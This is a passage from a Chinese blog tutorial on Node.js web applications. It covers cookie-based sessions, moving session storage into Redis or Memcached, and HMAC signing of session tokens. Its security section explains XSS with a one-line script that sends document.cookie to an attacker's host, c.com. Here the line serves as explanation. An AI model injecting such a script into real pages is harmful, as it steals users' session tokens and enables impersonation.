口令的键值（cookie键）</span></span><br><span class="line"><span class="keyword">var</span> EXPIRES = <span class="number">20</span> * <span class="number">60</span> * <span class="number">1000</span>;</span><br><span class="line"><span class="comment">// 将cookie转换成对象</span></span><br><span class="line"><span class="keyword">var</span> parseCookie = <span class="function"><span class="keyword">function</span>(<span class="params">cookie</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> cookies = &#123;&#125;;</span><br><span class="line">  <span class="keyword">if</span> (!cookie) &#123;</span><br><span class="line">    <span class="keyword">return</span> cookies;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">var</span> list = cookie.split(<span class="string">';'</span>);</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; list.length; i++) &#123;</span><br><span class="line">    <span class="keyword">var</span> pair = list[i].split(<span class="string">'='</span>);</span><br><span class="line">    cookies[pair[<span class="number">0</span>].trim()] = pair[<span class="number">1</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> cookies;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 将对象序列化</span></span><br><span class="line"><span class="keyword">var</span> serialize = <span class="function"><span class="keyword">function</span>(<span class="params">name, val, opt</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> pairs = [name + <span class="string">'='</span> + <span class="built_in">encodeURIComponent</span>(val)];</span><br><span class="line">  opt = opt || &#123;&#125;;</span><br><span class="line">  <span class="keyword">if</span> (opt.maxAge) pairs.push(<span class="string">'Max-Age='</span> + opt.maxAge);</span><br><span class="line">  <span class="keyword">if</span> (opt.domain) pairs.push(<span class="string">'Domain='</span> + opt.domain);</span><br><span class="line">  <span class="keyword">if</span> (opt.path) pairs.push(<span class="string">'Path='</span> + opt.path);</span><br><span class="line">  <span class="keyword">if</span> (opt.expires) pairs.push(<span class="string">'Expires='</span> + opt.expires.toUTCString());</span><br><span class="line">  <span class="keyword">if</span> (opt.httpOnly) pairs.push(<span class="string">'HttpOnly'</span>);</span><br><span class="line">  <span class="keyword">if</span> (opt.secure) pairs.push(<span class="string">'Secure'</span>);</span><br><span class="line">  <span class="keyword">return</span> pairs.join(<span class="string">'; '</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 生成session</span></span><br><span class="line"><span class="keyword">var</span> generate = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> session = &#123;&#125;;</span><br><span class="line">  session.id = (<span class="keyword">new</span> <span class="built_in">Date</span>()).getTime() + <span class="built_in">Math</span>.random();</span><br><span class="line">  session.cookie = &#123;</span><br><span class="line">    expire: (<span class="keyword">new</span> <span class="built_in">Date</span>()).getTime() + EXPIRES</span><br><span class="line">  &#125;;</span><br><span class="line">  sessions[session.id] = session;</span><br><span class="line">  <span class="keyword">return</span> session;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 处理业务逻辑</span></span><br><span class="line"><span class="keyword">var</span> handle = <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  res.setHeader(<span class="string">'Content-Type'</span>, <span class="string">'text/plain;charset=utf-8'</span>);</span><br><span class="line">  <span class="keyword">var</span> writeHead = res.writeHead;</span><br><span class="line">  res.writeHead = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> cookies = res.getHeader(<span class="string">'Set-Cookie'</span>);</span><br><span class="line">    <span class="keyword">var</span> session = serialize(key, req.session.id);     <span class="comment">// req.session.id 由服务端生成</span></span><br><span class="line">    cookies = <span class="built_in">Array</span>.isArray(cookies) ? cookies.concat(session) : [cookies, session];</span><br><span class="line">    res.setHeader(<span class="string">'Set-Cookie'</span>, cookies);</span><br><span class="line">    <span class="keyword">return</span> writeHead.apply(<span class="keyword">this</span>, <span class="built_in">arguments</span>);</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * 第一次访问：req.session 是新生成的，此时 isVisit 没有，将其设为 true</span></span><br><span class="line"><span class="comment">   * 非第一次访问：req.session 是之前生成的（没过时的话），isVisit 已经被设置成了 true</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">if</span> (!req.session.isVisit) &#123;</span><br><span class="line">    req.session.isVisit = <span class="literal">true</span>;</span><br><span class="line">    res.writeHead(<span class="number">200</span>);</span><br><span class="line">    res.end(<span class="string">'欢迎第一次来到动物园'</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    res.writeHead(<span class="number">200</span>);</span><br><span class="line">    res.end(<span class="string">'动物园再次欢迎你'</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">http.createServer(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 将 cookie 格式化，并挂载到 req 对象上</span></span><br><span class="line">  req.cookies = parseCookie(req.headers.cookie);</span><br><span class="line">  <span class="keyword">var</span> id = req.cookies[key];</span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * 注意：session是挂载在req对象上的，因为session只需要保存在服务器端。</span></span><br><span class="line"><span class="comment">   *   客户端只需要存储口令值即可。</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">if</span> (!id) &#123;</span><br><span class="line">    req.session = generate();</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> session = sessions[id];</span><br><span class="line">    <span class="keyword">if</span> (session) &#123;</span><br><span class="line">      <span class="keyword">if</span> (session.cookie.expire &gt; (<span class="keyword">new</span> <span class="built_in">Date</span>()).getTime()) &#123;</span><br><span class="line">        <span class="comment">// 更新超时时间</span></span><br><span class="line">        session.cookie.expire = (<span class="keyword">new</span> <span class="built_in">Date</span>()).getTime() + EXPIRES;</span><br><span class="line">        req.session = session;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 超时了，删除旧的数据，并重新生成</span></span><br><span class="line">        <span class="keyword">delete</span> sessions[id];</span><br><span class="line">        req.session = generate();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">// 如果session过期或口令不对，重新生成session</span></span><br><span class="line">      req.session = generate();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  handle(req, res);</span><br><span class="line">&#125;).listen(<span class="number">3002</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'server is listening on 3002'</span>);</span><br></pre></td></tr></table></figure></p>
<ul>
<li>通过查询字符串来实现浏览器端和服务器端数据的对应<br>原理：检查请求的查询字符串，如果没有值，会先生成新的带值的URL。</li>
</ul>
<h5 id="Session与内存"><a href="#Session与内存" class="headerlink" title="Session与内存"></a>Session与内存</h5><p>在上面示例代码中，都是将 session 数值直接存在变量 sessions 中，它位于内存中。</p>
<p>这里将数据存放在内存中将带来极大的隐患，如果用户增多，我们很可能就接触到了内存限制的上限，并且内存中的数据量加大，必然会引起垃圾回收的频繁扫描，引起性能问题。</p>
<p>另一个问题则是，我们可能为了利用多核CPU而启动多个进程，用户请求的连接将可能随意分配到各个进程中，Node的进程与进程之间是不能直接共享内存的，用户的 session 可能会引起错乱。</p>
<p>为了解决性能问题和 session 数据无法跨进程共享的问题，常用的方案是将 session 集中化，将原本可能分散在多个进程里的数据，统一转移到集中的数据存储中。目前常用的工具是 Redis、Memcached等，通过这些高效的缓存，Node进程无须在内部维护数据对象，垃圾回收问题和内存限制问题都可以迎刃而解，并且这些高速缓存设计的缓存过期策略更合理更高效，比在 Node 中自行设计缓存策略更好。</p>
<p>采用第三方缓存来存储session引起的一个问题是会引起网络访问。理论上来说，访问网络中的数据要比访问本地磁盘中的数据速度要慢，因为涉及到握手、传输以及网络终端自身的磁盘I/O等，尽管如此，依然会采用这些高速缓存的理由：</p>
<ul>
<li>Node与缓存服务保持长连接，而非频繁的短连接，握手导致的延迟只影响初始化。</li>
<li>高速缓存直接在内存中进行数据存储和访问。</li>
<li>缓存服务通常与Node进程运行在相同的机器上或者相同的机房里，网络速度受到的影响较小。</li>
</ul>
<p>此时，一旦session需要异步的方式获取，代码就需要略作调整，变成异步的方式：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> id = req.cookies[key];</span><br><span class="line">  <span class="keyword">if</span> (!id) &#123;</span><br><span class="line">    req.session = generate();</span><br><span class="line">    handle(req, res);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    store.get(id, <span class="function"><span class="keyword">function</span>(<span class="params">err, session</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (session) &#123;</span><br><span class="line">        <span class="keyword">if</span> (session.cookie.expire &gt; (<span class="keyword">new</span> <span class="built_in">Date</span>()).getTime()) &#123;</span><br><span class="line">          <span class="comment">// 更新超时时间</span></span><br><span class="line">          session.cookie.expire = (<span class="keyword">new</span> <span class="built_in">Date</span>()).getTime() + EXPIRES;</span><br><span class="line">          req.session = session;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="comment">// 超时了，删除旧的数据，并重新生成</span></span><br><span class="line">          <span class="keyword">delete</span> sessions[id];</span><br><span class="line">          req.session = generate();</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 如果session过期或口令不对，重新生成session</span></span><br><span class="line">        req.session = generate();</span><br><span class="line">      &#125;</span><br><span class="line">      handle(req, res);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>在响应时，将新的session保存回缓存中：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> writeHead = res.writeHead;</span><br><span class="line">res.writeHead = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> cookies = res.getHeader(<span class="string">'Set-Cookie'</span>);</span><br><span class="line">  <span class="keyword">var</span> session = serialize(key, req.session.id);     <span class="comment">// req.session.id 由服务端生成</span></span><br><span class="line">  cookies = <span class="built_in">Array</span>.isArray(cookies) ? cookies.concat(session) : [cookies, session];</span><br><span class="line">  res.setHeader(<span class="string">'Set-Cookie'</span>, cookies);</span><br><span class="line">  <span class="comment">// 保存回缓存</span></span><br><span class="line">  store.save(req.session);</span><br><span class="line">  <span class="keyword">return</span> writeHead.apply(<span class="keyword">this</span>, <span class="built_in">arguments</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<h5 id="Session与安全"><a href="#Session与安全" class="headerlink" title="Session与安全"></a>Session与安全</h5><p>保存在客户端中的session的口令可能会被盗用、伪造。一旦口令被伪造，服务器端的数据也可能间接被利用。如何让这个口令更安全？</p>
<p>有一种做法：将这个口令通过私钥加密进行签名，使得伪造的成本较高。客户端尽管可以伪造口令值，但是由于不知道私钥值，签名信息很难伪造。如此，只要在响应时将口令和签名进行对比，如果签名非法，将服务器端的数据立即过期即可。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 将值通过私钥签名，由.分割原值和签名</span></span><br><span class="line"><span class="keyword">var</span> sign = <span class="function"><span class="keyword">function</span>(<span class="params">val, secret</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> val + <span class="string">'.'</span> + crypto</span><br><span class="line">    .createHmac(<span class="string">'sha256'</span>, secret)</span><br><span class="line">    .update(val)</span><br><span class="line">    .digest(<span class="string">'base64'</span>)</span><br><span class="line">    .replace(<span class="regexp">/\=+$/</span>, <span class="string">''</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>在响应时，设置session值到cookie中或者跳转URL中。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> val = sign(req.sessionID, secret);</span><br><span class="line">res.setHeader(<span class="string">'Set-Cookie'</span>, cookie.serialize(key, val));</span><br></pre></td></tr></table></figure></p>
<p>接收请求时，检查签名：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 取出口令部分进行签名，对比用户提交的值</span></span><br><span class="line"><span class="keyword">var</span> unsign = <span class="function"><span class="keyword">function</span>(<span class="params">val, secret</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> str = val.slice(<span class="number">0</span>, val.lastIndexOf(<span class="string">'.'</span>));</span><br><span class="line">  <span class="keyword">return</span> sign(str, secret) == val ? str : <span class="literal">false</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>将口令进行签名是一个很好的解决方案，但是如果攻击者通过某种方式获取了一个真实的口令和签名，他就能实现身份的伪装。一种方案是将客户端的某些独有信息与口令作为原值，然后签名，这样攻击者一旦不在原始的客户端上进行访问，就会导致签名失败。独有信息包括用户IP和用户代理。</p>
<p>通常来说，将口令存在cookie中不易被人获取，但是一些别的漏洞可能导致这个口令被泄漏，典型的有XSS漏洞。</p>
<ul>
<li>XSS漏洞<br>跨站脚本攻击（Cross Site Scripting），通常是由网站开发者决定哪些脚本可以执行在浏览器端。<br>例如脚本<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location.href = <span class="string">'http://c.com/?'</span> + <span class="built_in">document</span>.cookie;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>这段代码将该用户的cookie提交给了c.com站点，这个站点就是攻击者的服务器，他也就能拿到该用户的session口令。然后在客户端中用这个口令伪造cookie，从而实现伪装用户的身份。</p>

        
        </div>
        <footer class="article-footer">
            <div class="share-container">



</div>

    <a data-url="http://yoursite.com/2017/08/27/构建Web应用1/" data-id="cjg9by5f4000mnc78l52rwjxo" class="article-share-link"><i class="fa fa-share"></i>Share</a>
<script>
    (function ($) {
        // Prevent duplicate binding
        if (typeof(__SHARE_BUTTON_BINDED__) === 'undefined' || !__SHARE_BUTTON_BINDED__) {
            __SHARE_BUTTON_BINDED__ = true;
        } else {
            return;
        }
        $('body').on('click', function() {
            $('.article-share-box.on').removeClass('on');
        }).on('click', '.article-share-link', function(e) {
            e.stopPropagation();

            var $this = $(this),
                url = $this.attr('data-url'),
                encodedUrl = encodeURIComponent(url),
                id = 'article-share-box-' + $this.attr('data-id'),
                offset = $this.offset(),
                box;

            if ($('#' + id).length) {
                box = $('#' + id);

                if (box.hasClass('on')){
                    box.removeClass('on');
                    return;
                }
            } else {
                var html = [
                    '<div id="' + id + '" class="article-share-box">',
                        '<input class="article-share-input" value="' + url + '">',
                        '<div class="article-share-links">',
                            '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="fa fa-twitter article-share-twitter" target="_blank" title="Twitter"></a>',
                            '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="fa fa-facebook article-share-facebook" target="_blank" title="Facebook"></a>',
                            '<a href="http://pinterest.com/pin/create/button/?url=' + encodedUrl + '" class="fa fa-pinterest article-share-pinterest" target="_blank" title="Pinterest"></a>',
                            '<a href="https://plus.google.com/share?url=' + encodedUrl + '" class="fa fa-google article-share-google" target="_blank" title="Google+"></a>',
                        '</div>',
                    '</div>'
                ].join('');

              box = $(html);

              $('body').append(box);
            }

            $('.article-share-box.on').hide();

            box.css({
                top: offset.top + 25,
                left: offset.left
            }).addClass('on');

        }).on('click', '.article-share-box', function (e) {
            e.stopPropagation();
        }).on('click', '.article-share-box-input', function () {
            $(this).select();
        }).on('click', '.article-share-box-link', function (e) {
            e.preventDefault();
            e.stopPropagation();

            window.open(this.href, 'article-share-box-window-' + Date.now(), 'width=500,height=450');
        });
    })(jQuery);
</script>

            
    

        </footer>
    </div>
    
        
<nav id="article-nav">
    
        <a href="/2017/09/04/构建Web应用2——缓存、数据上传/" id="article-nav-newer" class="article-nav-link-wrap">
            <strong class="article-nav-caption">Newer</strong>
            <div class="article-nav-title">
                
                    构建Web应用2——缓存、数据上传
                
            </div>
        </a>
    
    
        <a href="/2017/08/26/node模块实现/" id="article-nav-older" class="article-nav-link-wrap">
            <strong class="article-nav-caption">Older</strong>
            <div class="article-nav-title">node模块实现</div>
        </a>
    
</nav>


    
</article>


    
    

</section>
            
        </div>
        <footer id="footer">
    <div class="outer">
        <div id="footer-info" class="inner">
            &copy; 2018 unique.mo<br>
            Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>. Theme by <a href="http://github.com/ppoffice">PPOffice</a>
        </div>
    </div>
</footer>
        


    
        <script src="/libs/lightgallery/js/lightgallery.min.js"></script>
        <script src="/libs/lightgallery/js/lg-thumbnail.min.js"></script>
        <script src="/libs/lightgallery/js/lg-pager.min.js"></script>
        <script src="/libs/lightgallery/js/lg-autoplay.min.js"></script>
        <script src="/libs/lightgallery/js/lg-fullscreen.min.js"></script>
        <script src="/libs/lightgallery/js/lg-zoom.min.js"></script>
        <script src="/libs/lightgallery/js/lg-hash.min.js"></script>
        <script src="/libs/lightgallery/js/lg-share.min.js"></script>
        <script src="/libs/lightgallery/js/lg-video.min.js"></script>
    
    
        <script src="/libs/justified-gallery/jquery.justifiedGallery.min.js"></script>
    
    



<!-- Custom Scripts -->
<script src="/js/main.js"></script>

    </div>
</body>
</html>